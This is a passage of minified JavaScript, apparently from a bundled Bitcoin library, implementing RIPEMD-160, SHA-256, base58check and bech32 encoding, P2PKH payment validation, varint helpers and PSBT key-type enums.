  ].map((u) => Uint8Array.from(u)), Ag = Dd.map((u, f) => u.map((r) => zd[f][r])), Tg = Bd.map((u, f) => u.map((r) => zd[f][r])), Sg = Uint32Array.from([
    0,
    1518500249,
    1859775393,
    2400959708,
    2840853838
  ]), Ug = Uint32Array.from([
    1352829926,
    1548603684,
    1836072691,
    2053994217,
    0
  ]);
  function jh(u, f, r, c) {
    return u === 0 ? f ^ r ^ c : u === 1 ? f & r | ~f & c : u === 2 ? (f | ~r) ^ c : u === 3 ? f & c | r & ~c : f ^ (r | ~c);
  }
  const mf = new Uint32Array(16);
  class xg extends Od {
    constructor() {
      super(64, 20, 8, true), this.h0 = 1732584193, this.h1 = -271733879, this.h2 = -1732584194, this.h3 = 271733878, this.h4 = -1009589776;
    }
    get() {
      const { h0: f, h1: r, h2: c, h3: E, h4: b } = this;
      return [
        f,
        r,
        c,
        E,
        b
      ];
    }
    set(f, r, c, E, b) {
      this.h0 = f | 0, this.h1 = r | 0, this.h2 = c | 0, this.h3 = E | 0, this.h4 = b | 0;
    }
    process(f, r) {
      for (let X = 0; X < 16; X++, r += 4) mf[X] = f.getUint32(r, true);
      let c = this.h0 | 0, E = c, b = this.h1 | 0, p = b, x = this.h2 | 0, A = x, v = this.h3 | 0, m = v, B = this.h4 | 0, q = B;
      for (let X = 0; X < 5; X++) {
        const k = 4 - X, V = Sg[X], nt = Ug[X], it = Dd[X], mt = Bd[X], lt = Ag[X], ut = Tg[X];
        for (let ot = 0; ot < 16; ot++) {
          const Bt = yf(c + jh(X, b, x, v) + mf[it[ot]] + V, lt[ot]) + B | 0;
          c = B, B = v, v = yf(x, 10) | 0, x = b, b = Bt;
        }
        for (let ot = 0; ot < 16; ot++) {
          const Bt = yf(E + jh(k, p, A, m) + mf[mt[ot]] + nt, ut[ot]) + q | 0;
          E = q, q = m, m = yf(A, 10) | 0, A = p, p = Bt;
        }
      }
      this.set(this.h1 + x + m | 0, this.h2 + v + q | 0, this.h3 + B + E | 0, this.h4 + c + p | 0, this.h0 + b + A | 0);
    }
    roundClean() {
      Xa(mf);
    }
    destroy() {
      this.destroyed = true, Xa(this.buffer), this.set(0, 0, 0, 0, 0);
    }
  }
  const Og = xd(() => new xg()), Ng = Og, Rg = Uint32Array.from([
    1116352408,
    1899447441,
    3049323471,
    3921009573,
    961987163,
    1508970993,
    2453635748,
    2870763221,
    3624381080,
    310598401,
    607225278,
    1426881987,
    1925078388,
    2162078206,
    2614888103,
    3248222580,
    3835390401,
    4022224774,
    264347078,
    604807628,
    770255983,
    1249150122,
    1555081692,
    1996064986,
    2554220882,
    2821834349,
    2952996808,
    3210313671,
    3336571891,
    3584528711,
    113926993,
    338241895,
    666307205,
    773529912,
    1294757372,
    1396182291,
    1695183700,
    1986661051,
    2177026350,
    2456956037,
    2730485921,
    2820302411,
    3259730800,
    3345764771,
    3516065817,
    3600352804,
    4094571909,
    275423344,
    430227734,
    506948616,
    659060556,
    883997877,
    958139571,
    1322822218,
    1537002063,
    1747873779,
    1955562222,
    2024104815,
    2227730452,
    2361852424,
    2428436474,
    2756734187,
    3204031479,
    3329325298
  ]), ml = new Uint32Array(64);
  class Dg extends Od {
    constructor(f = 32) {
      super(64, f, 8, false), this.A = yl[0] | 0, this.B = yl[1] | 0, this.C = yl[2] | 0, this.D = yl[3] | 0, this.E = yl[4] | 0, this.F = yl[5] | 0, this.G = yl[6] | 0, this.H = yl[7] | 0;
    }
    get() {
      const { A: f, B: r, C: c, D: E, E: b, F: p, G: x, H: A } = this;
      return [
        f,
        r,
        c,
        E,
        b,
        p,
        x,
        A
      ];
    }
    set(f, r, c, E, b, p, x, A) {
      this.A = f | 0, this.B = r | 0, this.C = c | 0, this.D = E | 0, this.E = b | 0, this.F = p | 0, this.G = x | 0, this.H = A | 0;
    }
    process(f, r) {
      for (let B = 0; B < 16; B++, r += 4) ml[B] = f.getUint32(r, false);
      for (let B = 16; B < 64; B++) {
        const q = ml[B - 15], X = ml[B - 2], k = sn(q, 7) ^ sn(q, 18) ^ q >>> 3, V = sn(X, 17) ^ sn(X, 19) ^ X >>> 10;
        ml[B] = V + ml[B - 7] + k + ml[B - 16] | 0;
      }
      let { A: c, B: E, C: b, D: p, E: x, F: A, G: v, H: m } = this;
      for (let B = 0; B < 64; B++) {
        const q = sn(x, 6) ^ sn(x, 11) ^ sn(x, 25), X = m + q + pg(x, A, v) + Rg[B] + ml[B] | 0, V = (sn(c, 2) ^ sn(c, 13) ^ sn(c, 22)) + Eg(c, E, b) | 0;
        m = v, v = A, A = x, x = p + X | 0, p = b, b = E, E = c, c = X + V | 0;
      }
      c = c + this.A | 0, E = E + this.B | 0, b = b + this.C | 0, p = p + this.D | 0, x = x + this.E | 0, A = A + this.F | 0, v = v + this.G | 0, m = m + this.H | 0, this.set(c, E, b, p, x, A, v, m);
    }
    roundClean() {
      Xa(ml);
    }
    destroy() {
      this.set(0, 0, 0, 0, 0, 0, 0, 0), Xa(this.buffer);
    }
  }
  const Bg = xd(() => new Dg()), bl = Bg;
  function $r(u) {
    return Ng(bl(u));
  }
  Uint8Array.from([
    123,
    181,
    45,
    122,
    159,
    239,
    88,
    50,
    62,
    177,
    191,
    122,
    64,
    125,
    179,
    130,
    210,
    243,
    242,
    216,
    27,
    177,
    34,
    79,
    73,
    254,
    81,
    143,
    109,
    72,
    211,
    124,
    123,
    181,
    45,
    122,
    159,
    239,
    88,
    50,
    62,
    177,
    191,
    122,
    64,
    125,
    179,
    130,
    210,
    243,
    242,
    216,
    27,
    177,
    34,
    79,
    73,
    254,
    81,
    143,
    109,
    72,
    211,
    124
  ]), Uint8Array.from([
    241,
    239,
    78,
    94,
    192,
    99,
    202,
    218,
    109,
    148,
    202,
    250,
    157,
    152,
    126,
    160,
    105,
    38,
    88,
    57,
    236,
    193,
    31,
    151,
    45,
    119,
    165,
    46,
    216,
    193,
    204,
    144,
    241,
    239,
    78,
    94,
    192,
    99,
    202,
    218,
    109,
    148,
    202,
    250,
    157,
    152,
    126,
    160,
    105,
    38,
    88,
    57,
    236,
    193,
    31,
    151,
    45,
    119,
    165,
    46,
    216,
    193,
    204,
    144
  ]), Uint8Array.from([
    7,
    73,
    119,
    52,
    167,
    155,
    203,
    53,
    91,
    155,
    140,
    125,
    3,
    79,
    18,
    28,
    244,
    52,
    215,
    62,
    247,
    45,
    218,
    25,
    135,
    0,
    97,
    251,
    82,
    191,
    235,
    47,
    7,
    73,
    119,
    52,
    167,
    155,
    203,
    53,
    91,
    155,
    140,
    125,
    3,
    79,
    18,
    28,
    244,
    52,
    215,
    62,
    247,
    45,
    218,
    25,
    135,
    0,
    97,
    251,
    82,
    191,
    235,
    47
  ]), Uint8Array.from([
    174,
    234,
    143,
    220,
    66,
    8,
    152,
    49,
    5,
    115,
    75,
    88,
    8,
    29,
    30,
    38,
    56,
    211,
    95,
    28,
    181,
    64,
    8,
    212,
    211,
    87,
    202,
    3,
    190,
    120,
    233,
    238,
    174,
    234,
    143,
    220,
    66,
    8,
    152,
    49,
    5,
    115,
    75,
    88,
    8,
    29,
    30,
    38,
    56,
    211,
    95,
    28,
    181,
    64,
    8,
    212,
    211,
    87,
    202,
    3,
    190,
    120,
    233,
    238
  ]), Uint8Array.from([
    25,
    65,
    161,
    242,
    229,
    110,
    185,
    95,
    162,
    169,
    241,
    148,
    190,
    92,
    1,
    247,
    33,
    111,
    51,
    237,
    130,
    176,
    145,
    70,
    52,
    144,
    208,
    91,
    245,
    22,
    160,
    21,
    25,
    65,
    161,
    242,
    229,
    110,
    185,
    95,
    162,
    169,
    241,
    148,
    190,
    92,
    1,
    247,
    33,
    111,
    51,
    237,
    130,
    176,
    145,
    70,
    52,
    144,
    208,
    91,
    245,
    22,
    160,
    21
  ]), Uint8Array.from([
    244,
    10,
    72,
    223,
    75,
    42,
    112,
    200,
    180,
    146,
    75,
    242,
    101,
    70,
    97,
    237,
    61,
    149,
    253,
    102,
    163,
    19,
    235,
    135,
    35,
    117,
    151,
    198,
    40,
    228,
    160,
    49,
    244,
    10,
    72,
    223,
    75,
    42,
    112,
    200,
    180,
    146,
    75,
    242,
    101,
    70,
    97,
    237,
    61,
    149,
    253,
    102,
    163,
    19,
    235,
    135,
    35,
    117,
    151,
    198,
    40,
    228,
    160,
    49
  ]), Uint8Array.from([
    232,
    15,
    225,
    99,
    156,
    156,
    160,
    80,
    227,
    175,
    27,
    57,
    193,
    67,
    198,
    62,
    66,
    156,
    188,
    235,
    21,
    217,
    64,
    251,
    181,
    197,
    161,
    244,
    175,
    87,
    197,
    233,
    232,
    15,
    225,
    99,
    156,
    156,
    160,
    80,
    227,
    175,
    27,
    57,
    193,
    67,
    198,
    62,
    66,
    156,
    188,
    235,
    21,
    217,
    64,
    251,
    181,
    197,
    161,
    244,
    175,
    87,
    197,
    233
  ]), Uint8Array.from([
    72,
    28,
    151,
    28,
    60,
    11,
    70,
    215,
    240,
    178,
    117,
    174,
    89,
    141,
    78,
    44,
    126,
    215,
    49,
    156,
    89,
    74,
    92,
    110,
    199,
    158,
    160,
    212,
    153,
    2,
    148,
    240,
    72,
    28,
    151,
    28,
    60,
    11,
    70,
    215,
    240,
    178,
    117,
    174,
    89,
    141,
    78,
    44,
    126,
    215,
    49,
    156,
    89,
    74,
    92,
    110,
    199,
    158,
    160,
    212,
    153,
    2,
    148,
    240
  ]), Uint8Array.from([
    191,
    201,
    4,
    3,
    77,
    28,
    136,
    232,
    200,
    14,
    34,
    229,
    61,
    36,
    86,
    109,
    100,
    130,
    78,
    214,
    66,
    114,
    129,
    192,
    145,
    0,
    249,
    77,
    205,
    82,
    201,
    129,
    191,
    201,
    4,
    3,
    77,
    28,
    136,
    232,
    200,
    14,
    34,
    229,
    61,
    36,
    86,
    109,
    100,
    130,
    78,
    214,
    66,
    114,
    129,
    192,
    145,
    0,
    249,
    77,
    205,
    82,
    201,
    129
  ]);
  function zg(u) {
    if (u.length >= 255) throw new TypeError("Alphabet too long");
    const f = new Uint8Array(256);
    for (let v = 0; v < f.length; v++) f[v] = 255;
    for (let v = 0; v < u.length; v++) {
      const m = u.charAt(v), B = m.charCodeAt(0);
      if (f[B] !== 255) throw new TypeError(m + " is ambiguous");
      f[B] = v;
    }
    const r = u.length, c = u.charAt(0), E = Math.log(r) / Math.log(256), b = Math.log(256) / Math.log(r);
    function p(v) {
      if (v instanceof Uint8Array || (ArrayBuffer.isView(v) ? v = new Uint8Array(v.buffer, v.byteOffset, v.byteLength) : Array.isArray(v) && (v = Uint8Array.from(v))), !(v instanceof Uint8Array)) throw new TypeError("Expected Uint8Array");
      if (v.length === 0) return "";
      let m = 0, B = 0, q = 0;
      const X = v.length;
      for (; q !== X && v[q] === 0; ) q++, m++;
      const k = (X - q) * b + 1 >>> 0, V = new Uint8Array(k);
      for (; q !== X; ) {
        let mt = v[q], lt = 0;
        for (let ut = k - 1; (mt !== 0 || lt < B) && ut !== -1; ut--, lt++) mt += 256 * V[ut] >>> 0, V[ut] = mt % r >>> 0, mt = mt / r >>> 0;
        if (mt !== 0) throw new Error("Non-zero carry");
        B = lt, q++;
      }
      let nt = k - B;
      for (; nt !== k && V[nt] === 0; ) nt++;
      let it = c.repeat(m);
      for (; nt < k; ++nt) it += u.charAt(V[nt]);
      return it;
    }
    function x(v) {
      if (typeof v != "string") throw new TypeError("Expected String");
      if (v.length === 0) return new Uint8Array();
      let m = 0, B = 0, q = 0;
      for (; v[m] === c; ) B++, m++;
      const X = (v.length - m) * E + 1 >>> 0, k = new Uint8Array(X);
      for (; m < v.length; ) {
        const mt = v.charCodeAt(m);
        if (mt > 255) return;
        let lt = f[mt];
        if (lt === 255) return;
        let ut = 0;
        for (let ot = X - 1; (lt !== 0 || ut < q) && ot !== -1; ot--, ut++) lt += r * k[ot] >>> 0, k[ot] = lt % 256 >>> 0, lt = lt / 256 >>> 0;
        if (lt !== 0) throw new Error("Non-zero carry");
        q = ut, m++;
      }
      let V = X - q;
      for (; V !== X && k[V] === 0; ) V++;
      const nt = new Uint8Array(B + (X - V));
      let it = B;
      for (; V !== X; ) nt[it++] = k[V++];
      return nt;
    }
    function A(v) {
      const m = x(v);
      if (m) return m;
      throw new Error("Non-base" + r + " character");
    }
    return {
      encode: p,
      decodeUnsafe: x,
      decode: A
    };
  }
  var Mg = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  const Pr = zg(Mg);
  function Cg(u) {
    function f(b) {
      var p = Uint8Array.from(b), x = u(p), A = p.length + 4, v = new Uint8Array(A);
      return v.set(p, 0), v.set(x.subarray(0, 4), p.length), Pr.encode(v);
    }
    function r(b) {
      var p = b.slice(0, -4), x = b.slice(-4), A = u(p);
      if (!(x[0] ^ A[0] | x[1] ^ A[1] | x[2] ^ A[2] | x[3] ^ A[3])) return p;
    }
    function c(b) {
      var p = Pr.decodeUnsafe(b);
      if (p != null) return r(p);
    }
    function E(b) {
      var p = Pr.decode(b), x = r(p);
      if (x == null) throw new Error("Invalid checksum");
      return x;
    }
    return {
      encode: f,
      decode: E,
      decodeUnsafe: c
    };
  }
  function wg(u) {
    return bl(bl(u));
  }
  const bf = Cg(wg), gl = se;
  function Hg(u, f) {
    if (!u.address && !u.hash && !u.output && !u.pubkey && !u.input) throw new TypeError("Not enough data");
    f = Object.assign({
      validate: true
    }, f || {}), d0(ug(c0({
      network: c0({}),
      address: bd(),
      hash: ig,
      output: Ad(25),
      pubkey: f0(wh),
      signature: f0(Yh),
      input: Td
    })), u);
    const r = Gh(() => {
      const p = bf.decode(u.address), x = i0(p, 0), A = p.slice(1);
      return {
        version: x,
        hash: A
      };
    }), c = Gh(() => og(u.input)), E = u.network || Hm, b = {
      name: "p2pkh",
      network: E
    };
    if (Ql(b, "address", () => {
      if (!b.hash) return;
      const p = new Uint8Array(21);
      return El(p, 0, E.pubKeyHash), p.set(b.hash, 1), bf.encode(p);
    }), Ql(b, "hash", () => {
      if (u.output) return u.output.slice(3, 23);
      if (u.address) return r().hash;
      if (u.pubkey || b.pubkey) return $r(u.pubkey || b.pubkey);
    }), Ql(b, "output", () => {
      if (b.hash) return Lh([
        gl.OP_DUP,
        gl.OP_HASH160,
        b.hash,
        gl.OP_EQUALVERIFY,
        gl.OP_CHECKSIG
      ]);
    }), Ql(b, "pubkey", () => {
      if (u.input) return c()[1];
    }), Ql(b, "signature", () => {
      if (u.input) return c()[0];
    }), Ql(b, "input", () => {
      if (u.pubkey && u.signature) return Lh([
        u.signature,
        u.pubkey
      ]);
    }), Ql(b, "witness", () => {
      if (b.input) return [];
    }), f.validate) {
      let p = Uint8Array.from([]);
      if (u.address) {
        if (r().version !== E.pubKeyHash) throw new TypeError("Invalid version or Network mismatch");
        if (r().hash.length !== 20) throw new TypeError("Invalid address");
        p = r().hash;
      }
      if (u.hash) {
        if (p.length > 0 && Je(p, u.hash) !== 0) throw new TypeError("Hash mismatch");
        p = u.hash;
      }
      if (u.output) {
        if (u.output.length !== 25 || u.output[0] !== gl.OP_DUP || u.output[1] !== gl.OP_HASH160 || u.output[2] !== 20 || u.output[23] !== gl.OP_EQUALVERIFY || u.output[24] !== gl.OP_CHECKSIG) throw new TypeError("Output is invalid");
        const x = u.output.slice(3, 23);
        if (p.length > 0 && Je(p, x) !== 0) throw new TypeError("Hash mismatch");
        p = x;
      }
      if (u.pubkey) {
        const x = $r(u.pubkey);
        if (p.length > 0 && Je(p, x) !== 0) throw new TypeError("Hash mismatch");
        p = x;
      }
      if (u.input) {
        const x = c();
        if (x.length !== 2) throw new TypeError("Input is invalid");
        if (!Yh(x[0])) throw new TypeError("Input has invalid signature");
        if (!wh(x[1])) throw new TypeError("Input has invalid pubkey");
        if (u.signature && Je(u.signature, x[0]) !== 0) throw new TypeError("Signature mismatch");
        if (u.pubkey && Je(u.pubkey, x[1]) !== 0) throw new TypeError("Pubkey mismatch");
        const A = $r(x[1]);
        if (p.length > 0 && Je(p, A) !== 0) throw new TypeError("Hash mismatch");
      }
    }
    return Object.assign(b, u);
  }
  var Vl = {}, Xh;
  function Lg() {
    if (Xh) return Vl;
    Xh = 1, Object.defineProperty(Vl, "__esModule", {
      value: true
    }), Vl.bech32m = Vl.bech32 = void 0;
    const u = "qpzry9x8gf2tvdw0s3jn54khce6mua7l", f = {};
    for (let v = 0; v < u.length; v++) {
      const m = u.charAt(v);
      f[m] = v;
    }
    function r(v) {
      const m = v >> 25;
      return (v & 33554431) << 5 ^ -(m >> 0 & 1) & 996825010 ^ -(m >> 1 & 1) & 642813549 ^ -(m >> 2 & 1) & 513874426 ^ -(m >> 3 & 1) & 1027748829 ^ -(m >> 4 & 1) & 705979059;
    }
    function c(v) {
      let m = 1;
      for (let B = 0; B < v.length; ++B) {
        const q = v.charCodeAt(B);
        if (q < 33 || q > 126) return "Invalid prefix (" + v + ")";
        m = r(m) ^ q >> 5;
      }
      m = r(m);
      for (let B = 0; B < v.length; ++B) {
        const q = v.charCodeAt(B);
        m = r(m) ^ q & 31;
      }
      return m;
    }
    function E(v, m, B, q) {
      let X = 0, k = 0;
      const V = (1 << B) - 1, nt = [];
      for (let it = 0; it < v.length; ++it) for (X = X << m | v[it], k += m; k >= B; ) k -= B, nt.push(X >> k & V);
      if (q) k > 0 && nt.push(X << B - k & V);
      else {
        if (k >= m) return "Excess padding";
        if (X << B - k & V) return "Non-zero padding";
      }
      return nt;
    }
    function b(v) {
      return E(v, 8, 5, true);
    }
    function p(v) {
      const m = E(v, 5, 8, false);
      if (Array.isArray(m)) return m;
    }
    function x(v) {
      const m = E(v, 5, 8, false);
      if (Array.isArray(m)) return m;
      throw new Error(m);
    }
    function A(v) {
      let m;
      v === "bech32" ? m = 1 : m = 734539939;
      function B(V, nt, it) {
        if (it = it || 90, V.length + 7 + nt.length > it) throw new TypeError("Exceeds length limit");
        V = V.toLowerCase();
        let mt = c(V);
        if (typeof mt == "string") throw new Error(mt);
        let lt = V + "1";
        for (let ut = 0; ut < nt.length; ++ut) {
          const ot = nt[ut];
          if (ot >> 5 !== 0) throw new Error("Non 5-bit word");
          mt = r(mt) ^ ot, lt += u.charAt(ot);
        }
        for (let ut = 0; ut < 6; ++ut) mt = r(mt);
        mt ^= m;
        for (let ut = 0; ut < 6; ++ut) {
          const ot = mt >> (5 - ut) * 5 & 31;
          lt += u.charAt(ot);
        }
        return lt;
      }
      function q(V, nt) {
        if (nt = nt || 90, V.length < 8) return V + " too short";
        if (V.length > nt) return "Exceeds length limit";
        const it = V.toLowerCase(), mt = V.toUpperCase();
        if (V !== it && V !== mt) return "Mixed-case string " + V;
        V = it;
        const lt = V.lastIndexOf("1");
        if (lt === -1) return "No separator character for " + V;
        if (lt === 0) return "Missing prefix for " + V;
        const ut = V.slice(0, lt), ot = V.slice(lt + 1);
        if (ot.length < 6) return "Data too short";
        let Bt = c(ut);
        if (typeof Bt == "string") return Bt;
        const ft = [];
        for (let zt = 0; zt < ot.length; ++zt) {
          const he = ot.charAt(zt), Te = f[he];
          if (Te === void 0) return "Unknown character " + he;
          Bt = r(Bt) ^ Te, !(zt + 6 >= ot.length) && ft.push(Te);
        }
        return Bt !== m ? "Invalid checksum for " + V : {
          prefix: ut,
          words: ft
        };
      }
      function X(V, nt) {
        const it = q(V, nt);
        if (typeof it == "object") return it;
      }
      function k(V, nt) {
        const it = q(V, nt);
        if (typeof it == "object") return it;
        throw new Error(it);
      }
      return {
        decodeUnsafe: X,
        decode: k,
        encode: B,
        toWords: b,
        fromWordsUnsafe: p,
        fromWords: x
      };
    }
    return Vl.bech32 = A("bech32"), Vl.bech32m = A("bech32m"), Vl;
  }
  Lg();
  const Wr = {};
  function Yg(u, f) {
    u ? u !== Wr.eccLib && (Gg(u), Wr.eccLib = u) : Wr.eccLib = u;
  }
  const Yn = (u) => Ia(u);
  function Gg(u) {
    Ze(typeof u.isXOnlyPoint == "function"), Ze(u.isXOnlyPoint(Yn("79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798"))), Ze(u.isXOnlyPoint(Yn("fffffffffffffffffffffffffffffffffffffffffffffffffffffffeeffffc2e"))), Ze(u.isXOnlyPoint(Yn("f9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f9"))), Ze(u.isXOnlyPoint(Yn("0000000000000000000000000000000000000000000000000000000000000001"))), Ze(!u.isXOnlyPoint(Yn("0000000000000000000000000000000000000000000000000000000000000000"))), Ze(!u.isXOnlyPoint(Yn("fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"))), Ze(typeof u.xOnlyPointAddTweak == "function"), qg.forEach((f) => {
      const r = u.xOnlyPointAddTweak(Yn(f.pubkey), Yn(f.tweak));
      f.result === null ? Ze(r === null) : (Ze(r !== null), Ze(r.parity === f.parity), Ze(Je(r.xOnlyPubkey, Yn(f.result)) === 0));
    });
  }
  function Ze(u) {
    if (!u) throw new Error("ecc library invalid");
  }
  const qg = [
    {
      pubkey: "79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798",
      tweak: "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364140",
      parity: -1,
      result: null
    },
    {
      pubkey: "1617d38ed8d8657da4d4761e8057bc396ea9e4b9d29776d4be096016dbd2509b",
      tweak: "a8397a935f0dfceba6ba9618f6451ef4d80637abf4e6af2669fbc9de6a8fd2ac",
      parity: 1,
      result: "e478f99dab91052ab39a33ea35fd5e6e4933f4d28023cd597c9a1f6760346adf"
    },
    {
      pubkey: "2c0b7cf95324a07d05398b240174dc0c2be444d96b159aa6c7f7b1e668680991",
      tweak: "823c3cd2142744b075a87eade7e1b8678ba308d566226a0056ca2b7a76f86b47",
      parity: 0,
      result: "9534f8dc8c6deda2dc007655981c78b49c5d96c778fbf363462a11ec9dfd948c"
    }
  ], Md = "0123456789abcdefABCDEF";
  Md.split("").map((u) => u.codePointAt(0));
  Array(256).fill(true).map((u, f) => {
    const r = String.fromCodePoint(f), c = Md.indexOf(r);
    return c < 0 ? void 0 : c < 16 ? c : c - 6;
  });
  new TextEncoder();
  new TextDecoder();
  function jg(u, f, r, c) {
    if (f + 2 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (c = c.toUpperCase(), r > 65535) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= 65535. Received ${r}`);
    c === "LE" ? (u[f] = r & 255, u[f + 1] = r >> 8 & 255) : (u[f] = r >> 8 & 255, u[f + 1] = r & 255);
  }
  function Xg(u, f, r, c) {
    if (f + 4 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (c = c.toUpperCase(), r > 4294967295) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= ${4294967295}. Received ${r}`);
    c === "LE" ? (u[f] = r & 255, u[f + 1] = r >> 8 & 255, u[f + 2] = r >> 16 & 255, u[f + 3] = r >> 24 & 255) : (u[f] = r >> 24 & 255, u[f + 1] = r >> 16 & 255, u[f + 2] = r >> 8 & 255, u[f + 3] = r & 255);
  }
  function Kg(u, f, r, c) {
    if (f + 8 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (c = c.toUpperCase(), r > 0xffffffffffffffffn) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= ${0xffffffffffffffffn}. Received ${r}`);
    c === "LE" ? (u[f] = Number(r & 0xffn), u[f + 1] = Number(r >> 8n & 0xffn), u[f + 2] = Number(r >> 16n & 0xffn), u[f + 3] = Number(r >> 24n & 0xffn), u[f + 4] = Number(r >> 32n & 0xffn), u[f + 5] = Number(r >> 40n & 0xffn), u[f + 6] = Number(r >> 48n & 0xffn), u[f + 7] = Number(r >> 56n & 0xffn)) : (u[f] = Number(r >> 56n & 0xffn), u[f + 1] = Number(r >> 48n & 0xffn), u[f + 2] = Number(r >> 40n & 0xffn), u[f + 3] = Number(r >> 32n & 0xffn), u[f + 4] = Number(r >> 24n & 0xffn), u[f + 5] = Number(r >> 16n & 0xffn), u[f + 6] = Number(r >> 8n & 0xffn), u[f + 7] = Number(r & 0xffn));
  }
  function Qg(u, f, r) {
    if (f + 2 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (r = r.toUpperCase(), r === "LE") {
      let c = 0;
      return c = (c << 8) + u[f + 1], c = (c << 8) + u[f], c;
    } else {
      let c = 0;
      return c = (c << 8) + u[f], c = (c << 8) + u[f + 1], c;
    }
  }
  function Vg(u, f, r) {
    if (f + 4 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (r = r.toUpperCase(), r === "LE") {
      let c = 0;
      return c = (c << 8) + u[f + 3] >>> 0, c = (c << 8) + u[f + 2] >>> 0, c = (c << 8) + u[f + 1] >>> 0, c = (c << 8) + u[f] >>> 0, c;
    } else {
      let c = 0;
      return c = (c << 8) + u[f] >>> 0, c = (c << 8) + u[f + 1] >>> 0, c = (c << 8) + u[f + 2] >>> 0, c = (c << 8) + u[f + 3] >>> 0, c;
    }
  }
  function Zg(u, f, r) {
    if (f + 8 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (r = r.toUpperCase(), r === "LE") {
      let c = 0n;
      return c = (c << 8n) + BigInt(u[f + 7]), c = (c << 8n) + BigInt(u[f + 6]), c = (c << 8n) + BigInt(u[f + 5]), c = (c << 8n) + BigInt(u[f + 4]), c = (c << 8n) + BigInt(u[f + 3]), c = (c << 8n) + BigInt(u[f + 2]), c = (c << 8n) + BigInt(u[f + 1]), c = (c << 8n) + BigInt(u[f]), c;
    } else {
      let c = 0n;
      return c = (c << 8n) + BigInt(u[f]), c = (c << 8n) + BigInt(u[f + 1]), c = (c << 8n) + BigInt(u[f + 2]), c = (c << 8n) + BigInt(u[f + 3]), c = (c << 8n) + BigInt(u[f + 4]), c = (c << 8n) + BigInt(u[f + 5]), c = (c << 8n) + BigInt(u[f + 6]), c = (c << 8n) + BigInt(u[f + 7]), c;
    }
  }
  const Ig = (u) => {
    if (u < 0 || u > 0xffffffffffffffffn) throw new RangeError("value out of range");
  };
  function Jg(u) {
    if (u < 0 || u > Number.MAX_SAFE_INTEGER || u % 1 !== 0) throw new RangeError("value out of range");
  }
  function Cd(u) {
    typeof u == "number" ? Jg(u) : Ig(u);
  }
  function Fg(u, f, r) {
    Cd(u), r === void 0 && (r = 0), f === void 0 && (f = new Uint8Array(wd(u)));
    let c = 0;
    return u < 253 ? (f.set([
      Number(u)
    ], r), c = 1) : u <= 65535 ? (f.set([
      253
    ], r), jg(f, r + 1, Number(u), "LE"), c = 3) : u <= 4294967295 ? (f.set([
      254
    ], r), Xg(f, r + 1, Number(u), "LE"), c = 5) : (f.set([
      255
    ], r), Kg(f, r + 1, BigInt(u), "LE"), c = 9), {
      buffer: f,
      bytes: c
    };
  }
  function kg(u, f) {
    f === void 0 && (f = 0);
    const r = u.at(f);
    if (r === void 0) throw new Error("buffer too small");
    if (r < 253) return {
      numberValue: r,
      bigintValue: BigInt(r),
      bytes: 1
    };
    if (r === 253) {
      const c = Qg(u, f + 1, "LE");
      return {
        numberValue: c,
        bigintValue: BigInt(c),
        bytes: 3
      };
    } else if (r === 254) {
      const c = Vg(u, f + 1, "LE");
      return {
        numberValue: c,
        bigintValue: BigInt(c),
        bytes: 5
      };
    } else {
      const c = Zg(u, f + 1, "LE");
      return {
        numberValue: c <= Number.MAX_SAFE_INTEGER ? Number(c) : null,
        bigintValue: c,
        bytes: 9
      };
    }
  }
  function wd(u) {
    return Cd(u), u < 253 ? 1 : u <= 65535 ? 3 : u <= 4294967295 ? 5 : 9;
  }
  Ia("0000000000000000000000000000000000000000000000000000000000000000");
  Ia("0000000000000000000000000000000000000000000000000000000000000001");
  Ia("ffffffffffffffff");
  var Kh;
  (function(u) {
    u[u.UNSIGNED_TX = 0] = "UNSIGNED_TX", u[u.GLOBAL_XPUB = 1] = "GLOBAL_XPUB";
  })(Kh || (Kh = {}));
  var Gn;
  (function(u) {
    u[u.NON_WITNESS_UTXO = 0] = "NON_WITNESS_UTXO", u[u.WITNESS_UTXO = 1] = "WITNESS_UTXO", u[u.PARTIAL_SIG = 2] = "PARTIAL_SIG", u[u.SIGHASH_TYPE = 3] = "SIGHASH_TYPE", u[u.REDEEM_SCRIPT = 4] = "REDEEM_SCRIPT", u[u.WITNESS_SCRIPT = 5] = "WITNESS_SCRIPT", u[u.BIP32_DERIVATION = 6] = "BIP32_DERIVATION", u[u.FINAL_SCRIPTSIG = 7] = "FINAL_SCRIPTSIG", u[u.FINAL_SCRIPTWITNESS = 8] = "FINAL_SCRIPTWITNESS", u[u.POR_COMMITMENT = 9] = "POR_COMMITMENT", u[u.TAP_KEY_SIG = 19] = "TAP_KEY_SIG", u[u.TAP_SCRIPT_SIG = 20] = "TAP_SCRIPT_SIG", u[u.TAP_LEAF_SCRIPT = 21] = "TAP_LEAF_SCRIPT", u[u.TAP_BIP32_DERIVATION = 22] = "TAP_BIP32_DERIVATION", u[u.TAP_INTERNAL_KEY = 23] = "TAP_INTERNAL_KEY", u[u.TAP_MERKLE_ROOT = 24] = "TAP_MERKLE_ROOT";
  })(Gn || (Gn = {}));
  var vl;
  (function(u) {
    u[u.REDEEM_SCRIPT = 0] = "REDEEM_SCRIPT", u[u.WITNESS_SCRIPT = 1] = "WITNESS_SCRIPT", u[u.BIP32_DERIVATION = 2] = "BIP32_DERIVATION", u[u.TAP_INTERNAL_KEY = 5] = "TAP_INTERNAL_KEY", u[u.TAP_TREE = 6] = "TAP_TREE", u[u.TAP_BIP32_DERIVATION = 7] = "TAP_BIP32_DERIVATION";
  })(vl || (vl = {}));
  const $g = (u) => [
    ...Array(u).keys()
  ], Pg = (u) => u.length === 33 && [
    2,
    3
  ].includes(u[0]) || u.length === 65 && u[0] === 4;
  function m0(u, f = Pg) {
    function r(x) {
